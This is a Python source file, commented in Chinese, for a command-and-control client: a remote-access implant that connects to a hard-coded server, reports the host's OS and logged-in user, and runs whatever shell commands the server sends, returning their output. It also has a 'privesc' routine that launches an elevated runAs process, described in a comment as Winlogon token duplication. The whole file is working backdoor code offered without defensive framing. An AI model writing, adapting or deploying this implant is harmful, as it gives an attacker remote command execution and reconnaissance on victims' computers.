import socket
import time
import os
import json
import subprocess
import platform  # 用于检测系统类型

class C2Client:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port

    def connect_to_server(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                print("Connected to C2 server")
                self.send_system_info()
                break
            except Exception as e:
                print(f"Connection failed: {e}")
                time.sleep(5)

    def send_system_info(self):
        system_info = {
            "system": platform.system(),
            "user": os.getlogin()
        }
        self.socket.send(json.dumps(system_info).encode())

    def execute_privilege_escalation(self):
        # 复制Winlogon令牌并创建系统权限的CMD会话
        try:
            winlogon_process = subprocess.run(["powershell", "-Command", "(Get-Process winlogon).Id"], capture_output=True, text=True)
            winlogon_pid = winlogon_process.stdout.strip()
            if winlogon_pid:
                privilege_command = 'powershell -Command "Start-Process cmd -ArgumentList \'/c "py.exe D:\\study\\VISUALSTUDIO\\project\\python\\privesc_client.py"\' -Verb runAs"'
                subprocess.run(privilege_command, shell=True)
                print("Privilege escalation executed")
                self.socket.send(json.dumps({"result": "Privilege escalation executed"}).encode())
            else:
                print("Failed to find Winlogon process ID")
                self.socket.send(json.dumps({"result": "Failed to find Winlogon process ID"}).encode())
        except Exception as e:
            print(f"Error during privilege escalation: {e}")
            self.socket.send(json.dumps({"result": f"Error during privilege escalation: {e}"}).encode())

    def listen_for_commands(self):
        while True:
            try:
                data = self.socket.recv(4096).decode()
                if not data:
                    continue
                data = json.loads(data)
                if "command" in data:
                    command = data["command"]
                    print(f"Received command: {command}")
                    if command == "exit":
                        self.socket.close()
                        break
                    elif command == "privesc":
                        self.execute_privilege_escalation()
                    else:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = result.stdout + result.stderr
                        self.socket.send(json.dumps({"result": output}).encode())
            except (ValueError, json.JSONDecodeError) as e:
                print(f"Error decoding: {e}")
            except Exception as e:
                print(f"Error: {e}")
                self.socket.close()
                self.connect_to_server()

if __name__ == "__main__":
    client = C2Client("192.168.0.189", 8888)
    client.connect_to_server()
    client.listen_for_commands()
